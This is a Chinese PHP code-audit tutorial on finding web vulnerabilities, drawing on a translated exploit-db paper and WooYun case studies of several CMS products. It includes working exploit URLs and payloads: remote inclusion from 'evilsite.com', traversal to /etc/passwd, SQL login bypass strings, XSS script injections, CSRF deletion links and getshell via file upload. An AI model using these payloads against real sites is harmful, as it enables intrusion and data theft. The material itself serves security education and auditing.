# PHP漏洞挖掘思路+实例 第二章

0x00 背景
-------

* * *

感谢各位的评论与讨论，经过研讨的地方在文章中标出。

先翻译整理一篇英文paper，后面再填上自己新发现的例子，先思路再实例 O(∩_∩)O

补充之前第一篇文章中思路，重新加入了最近发现的一些实例（也有部分来自wooyun上的牛人们已公开的漏洞，漏洞归属原作者并均在文章内标明）

（感谢瞌睡龙指导：注意各种漏洞的前提配置环境，先列出来，之后详细说）

在文章中的测试条件下，我们的配置默认是这样子的

```
safe_mode = off (避免各种奇奇怪怪的失败)
disabled_functions = N/A ( 可以使用全部函数，免得莫名其妙的不能用 )
register_globals = on ( 注册全局变量 )
allow_url_include = on ( 文件包含时的限制，如果关了就不能远程 )
allow_url_fopen = on ( 文件打开的限制，还是开着吧 )
magic_quotes_gpc = off ( 转义引号和划线和空字符，比如” 变成\“ )
short_tag_open = on ( 部分脚本会用到 ) 
file_uploads = on ( 任意文件上传需要……允许上传文件 )
display_errors = on ( 自己测试时方便，找错误 )

```

0x01 任意文件包含
-----------

* * *

前提：允许url_include，否则就需要上传到绝对路径

提示：可以使用空字节（截断）的技巧，和“?”问号的使用技巧

php中有四个函数与文件包含有关：

```
require
require_once 只包含一次
include 
include_once 只包含一次

```

如以下例子：

```
<?php
    $pagina=$_GET['pagina'];
    include $pagina.'logged=1';
?>

```

使用空字节的例子

```
http://127.0.0.1/test.php?pagina=http://evilsite.com/evilscript.txt%00

```

这样可以去掉末尾的.php后缀

再如以下例子

```
<?php
    $pagina=$_GET['pagina'];
    include $pagina.'logged=1';
?>

```

使用“?”问号的例子

```
http://127.0.0.1/test.php?pagina=http://evilsite.com/evilscript.txt?logged=1

```

这样可以把后面的一大坨东西弄没

如何修复：

```
allow_url_include = on
allow_url_fopen = on

```

简单来说：不要允许特殊字符出现，过滤“/”，或者过滤http，https，ftp和SMB

好吧，来举一个乌云上Frears的例子

[WooYun: ecmall本地文件包含](http://www.wooyun.org/bugs/wooyun-2011-02654)

```
//只判断是app是否设置，然后去掉了两端空格 
$app = isset($_REQUEST['app']) ? trim($_REQUEST['app']) : $default_app; 
$act = isset($_REQUEST['act']) ? trim($_REQUEST['act']) : $default_act; 

//很明显可以看出$app是我们可以控制的、由于后面连接了.app.php所以利用的时候要截断。 
$app_file = $config['app_root'] . "/{$app}.app.php";     

//应为是本地包函、所以is_file是为真的 
if (!is_file($app_file))     
{     
    exit('Missing controller');     
}     

//这里直接就包函了，这么低级的漏洞、我都不好说什么了. 
require($app_file);

```

还有一些特殊的思路，比如Joker的构造

[WooYun: 济南大学主站本地文件包含导致代码执行](http://www.wooyun.org/bugs/wooyun-2011-02236)

自己去看吧，我还以为只有教科书里边才可能出现……

挖掘的可能方法：全局搜索四个函数，先只管出现在文件中间的require等前后文是否有严格的验证，之后在通读时注意文件前部的include

0x02 本地文件包含
-----------

* * *

提示：在windows系统下面我们可以用 "..\" 来代替 "../" 即 "..%5C" ( url编码后 ).

如下例：

```
<?php
    $pagina=$_GET['pagina'];
    include '/pages/'.$pagina;
?>

```

利用的例子：

```
http://127.0.0.1/test.php?pagina=../../../../../../etc/passwd

```

空字节截断和问号的技巧通用

其实和上面的差不多，只不过是用到了跨目录

修复方式：过滤点和斜杠

0x03 任意文件下载
-----------

* * *

前提：url_fopen为on时才能打开远程文件，但一般意义上的任意文件下载不是“远程“的

相比上一篇文章补充：

```
   file_get_contents  读取整个文件到字符串中
   readfile           显示整个文件
   file               读进数组
   fopen              打开文件或URL
   highlight_file     高亮显示源码
   show_source        显示源代码

```

例子同上一篇文章

0x04 SQL注入
----------

* * *

前提：magic_quotes_gpc = off 当然指的是字符型的注射，如果是数字型就仍然可以盲注

补充登陆绕过的情况：

```
$postbruger = $_POST['username'];
$postpass = md5($_POST['password']); 
$resultat = mysql_query("SELECT * FROM " . $tablestart . "login WHERE brugernavn = '$postbruger' AND password = '$postpass'") 
or die("<p>" . mysql_error() . "</p>\n");

```

这时利用时会方便很多

```
username : admin ' or ' 1=1
password : sirgod

```

挖掘方法：在登陆逻辑处发现注射，不急着跑表，可以考虑绕过登陆

0x05 命令执行
---------

* * *

参考《高级PHP应用程序漏洞审核技术》（Ph4nt0m Security Team），小伙伴们都去百度一下吧

（以下节选一小部分有关命令执行的内容）

### 5.4 代码注射

#### 5.4.1 PHP中可能导致代码注射的函数

很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可 以执行代码如：

```
assert()
call_user_func()
call_user_func_array()
create_function()

```

变量函数

这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：

```
<?php
//how to exp this code
$sort_by=$_GET["sort_by"];
$sorter="strnatcasecmp";
$databases=array("test","test");
$sort_function = " return 1 * " . $sorter . "($a["" . $sort_by . ""], $b["" . $sort_by . ""]);
";
usort($databases, create_function("$a, $b", $sort_function));

```

漏洞审计策略

PHP版本要求：无 系统要求：无 审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）

#### 5.4.2 变量函数与双引号

对于单引号和双引号的区别，很多程序员深有体会，示例代码：

```
echo "$a\n";
echo "$a\n";

```

我们再看如下代码：

```
//how to exp this code
if($globals["bbc_email"]){
$text = preg_replace(
array("/\[email=(.*?)\](.*?)\[\/email\]/ies",
"/\[email\](.*?)\[\/email\]/ies"),
array("check_email("$1", "$2")",
"check_email("$1", "$1")"), $text);

```

另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很 容易被人注射变量函数。

漏洞审计策略

PHP版本要求：无 系统要求：无 审计策略：通读代码

0x06 跨站脚本漏洞XSS
--------------

* * *

```
<?php
    $name=$_GET['name'];
    print $name;
?>





http://127.0.0.1/test.php?name=<script>alert("XSS")</script>





#!php
<?php
    $name=addslashes($_GET['name']);
    print '<table name="'.$name.'"></table>';
?>





http://127.0.0.1/test.php?name="><script>alert(String.fromCharCode(88,83,83))</script>

```

fromCharCode用来绕过addslashes

挖掘方法：关注负责输出的代码，牢记之前程序处理变量的一般逻辑（过滤html标签的力度？）

0x07 变量覆盖
---------

* * *

前提：需要register_gloabals = on

```
<?php
    if ($logged==true) {
    echo 'Logged in.'; }
    else {
    print 'Not logged in.';
    }
?>





http://127.0.0.1/test.php?logged=1

```

免认证即登陆

0x08 admin节点可被越权访问
------------------

* * *

```
http://127.0.0.1/admin/files.php
http://127.0.0.1/admin/db_lookup.php

```

若是无身份验证直接就能访问，可能存在此漏洞

挖掘方法：先开register_gloabals = on ，然后留意第一次出现的变量

0x09 跨站点请求伪造CSRF
----------------

* * *

前提：没有token 一般结合XSS来做

```
<?php
    check_auth();
    if(isset($_GET['news']))
    { unlink('files/news'.$news.'.txt'); }
    else { 
    die('File not deleted'); }
?>





http://127.0.0.1/test.php?news=1

```

会导致文件删除，当然，需要过check_auth，不过在CSRF下不是问题

```
if ($_GET['func'] == 'delete') {
           $del_id = $_GET['id'];
           $query2121 = "select ROLE from {$db_prefix}members WHERE ID='$del_id'";
           $result2121 = mysql_query($query2121) or die("delete.php - Error in query: $query2121");
           while ($results2121 = mysql_fetch_array($result2121)) {
           $their_role = $results2121['ROLE'];
}
if ($their_role != '1') {
mysql_query("DELETE FROM {$db_prefix}members WHERE id='$del_id'") 
or die(mysql_error()); 

```

关键是在于操作没有任何类型的确认，只要提交请求即可见效

```
http://127.0.0.1/index.php?page=admin&act=members&func=delete&id=4

```

如何修补：token

```
<?php
    check_auth();
    if(isset($_GET['news']) && $token=$_SESSION['token'])
    { unlink('files/news'.$news.'.txt'); }
    else { 
    die('Error.'); }
?>

```

这样就不能伪造啦

```
http://127.0.0.1/index.php?delete=1&token=[RANDOM_TOKEN]

```

挖掘方法：敏感功能如 “添加管理员” “修改密码” “直接把shell地址给到别人邮箱里”观察是否有token验证或者其他形式的验证

0x10 参考文献
---------

* * *

部分内容参考自【英文】[http://www.exploit-db.com/papers/12871/](http://www.exploit-db.com/papers/12871/)Name : Finding vulnerabilities in PHP scripts FULL ( with examples ) Author : SirGod Email :sirgod08@gmail.com

lxj616@wooyun 引用处进行了翻译

以下是最新自己发现的例子

0x11 CSCMS V3.5 最新版 SQL注射（官方站演示+源码详析）
-------------------------------------

* * *

[WooYun: CSCMS V3.5 最新版 SQL注射（官方站演示+源码详析）](http://www.wooyun.org/bugs/wooyun-2013-047363)

PS：CSCMS真是好教材……

感谢 @五道口杀气 在上一篇的回复：

```
MVC的代码看一下框架本身实现有没有问题，然后去看model就行了，model有多强，决定了有多大的空间，而变量的过滤在controller里调用时应该几乎是差不多的，所以这类代码从index.php开始读可能也不是太有必要

```

经过仔细的琢磨，我有了更深的体会，比如本次漏洞中，CSCMS重构了代码，使用了MVC架构，果然是model的xss_clean被误用（或者说model根本没有防范注射的功能），导致controller里面射成一片，因此可以说我之前的“从index.php开始“很不恰当，应当视情况而定

感谢 @erevus 在上一篇的回复：

```
我说说的我经验     挖SQL注入，全局搜索select,insert,updata这几个关键字 然后找到SQL语句 向上跟 跟到传入变量的地方 看看中途有没有过滤     挖任意代码执行，全局搜索各种可以执行命令的函数，然后也是一个个看 向上跟.（一直没挖到...）     挖XSS...直接黑盒挖，看看有没有过滤 过滤了的话就去看过滤的代码是怎样 然后看看能不能绕...感觉如果是框架的话，只搜索SELECT关键字可能会有遗漏，因为有很多都是比如：

$member->where ( "username ='" . $username . "'" )->save ( $arr_i ); // 更新状态

```

这样的框架很容易遗漏重要拼接

PS:强烈同意erevus的XSS的挖掘方法，因为能力和精力都很有限……

0x12 MacCMS 全版本通杀SQL注射（包括最新7.x）
-------------------------------

* * *

[WooYun: MacCMS 全版本通杀SQL注射（包括最新7.x）](http://www.wooyun.org/bugs/wooyun-2014-048553)

也是重构了代码，加入了360的防护脚本，其实在我发上一个漏洞（6.x）时这个7.x刚好发布，我稍微看了一眼，发现有360防护脚本后就不看了，以为他们肯定全都过滤掉了，直到…… 比较有趣的是他们根本没有在referer上使用360的获取方式，而是直接`return $_SERVER["HTTP_REFERER"];`了 因此提醒大家，代码审计就是要仔细，就是要有超人般的耐心，不要想当然。

0x13 WanCMS 可修改任意用户密码（源码详析+实例演示）
--------------------------------

* * *

[WooYun: WanCMS 可修改任意用户密码（源码详析+实例演示）](http://www.wooyun.org/bugs/wooyun-2014-049284)

我终于又发现了一个敏感业务逻辑上的漏洞

唠叨两句密码学……

MD5、SHA 是哈希函数，知道$a后容易知道md5($a)，而知道md5($a)难以恢复$a Des 是对称密码，加解密使用同一个密钥

```
$reurl = $config ['DOMAIN'] . '/accounts/forget_password_t?vc=' . md5 ( md5 ( $username ) );

```

这里的密码重置链接 使用的是MD5（两遍），但是用户名我们是知道的，因此直接就能伪造，这也说明了md5并不是用来加密的，应该用DES或者……更常见的方法是MD5中的用户名再加入密码和随机数，或者干脆随机一串字符好了。

0x14 WanCMS 多处SQL注射（源码详析+实站演示）
------------------------------

* * *

[WooYun: WanCMS 多处SQL注射（源码详析+实站演示）](http://www.wooyun.org/bugs/wooyun-2014-049372)

又是一个框架中注射的例子

```
$u_info = $member->where ( "username ='" . $username . "'" )->find ();

```

之前username没有过滤，虽然看着和带着SELECT的完整SQL语句有区别，但是效果是一样的

0x15 CSCMS V3.5 最新补丁后 又一个SQL注射（源码详析）
------------------------------------

* * *

[WooYun: CSCMS V3.5 最新补丁后 又一个SQL注射（源码详析）](http://www.wooyun.org/bugs/wooyun-2014-050942)

这个就是一个厂商漏补的addslash+无引号 盲注 但是比较有新意的是，他们好像有一阵是用的magic_quotes_gpc来处理的，只是给数字补上了好多的引号，而且还漏了几个……

0x16 TCCMS （最新）8.0 后台GETSHELL （源码详析）

[WooYun: TCCMS （最新）8.0 后台GETSHELL （源码详析）](http://www.wooyun.org/bugs/wooyun-2014-050834)

任意文件上传，前提是upload为ON

```
$fullPath = $path . "/" . $_POST["name"];

```

居然直接从POST里面取。

一般情况下应该是uuid随机数名称，或者至少去不可见字符强加后缀。

直接从POST中取值的下场就是任意文件上传。

0x17 iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）
----------------------------------------

* * *

[WooYun: iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）](http://www.wooyun.org/bugs/wooyun-2013-046702)

这个注射有一个特别之处，就是过滤了逗号（，），因此跑表时非常不顺利，需要想其他的方法来验证危害

```
$tos = explode(',',trim($arr['to'])); 

```

没错，这一句干掉了逗号

解决方案：不跑表了，试着构造错误回显（因为常规那页面是没有回显的）直接爆管理员密码

思路总结：变量到达第一个注射语句没有逗号无法突破无法回显，坚持继续读，程序能继续运行，然后发现下面还有一句也会被注射到，然后注射到的结果又拼接到另一个SQL语句中，而报错又是开启状态，因此构造一下在SQL报错的地方回显出密码

0x18 CSCMS V3.5 最新版 后台命令执行GETSHELL（源码详析）
----------------------------------------

* * *

[WooYun: CSCMS V3.5 最新版 后台命令执行GETSHELL（源码详析）](http://www.wooyun.org/bugs/wooyun-2013-046603)

感谢@insight-labs的回复： 框架会有很多很隐蔽的洞，现在还不太清楚怎么具体挖掘。比如双引号导致的代码执行。

千奇百怪的洞 的确很头疼 我这个漏洞本是想仿造《Dede后台getshell[过20130715]》原作者不详 结果……不大一样 不过思路是：后台总会有保存设置的地方，而保存设置的地方往往是写config.php保存设置（因为php扩展名可以防止被随意下载ETC）而这样的话如果保存设置时过滤不足，就有可能导致任意文件写入，而且又是php文件，动不动就会来个代码执行 ：）

不过感觉隐蔽的漏洞还是很费脑力的，一般的思考发现不了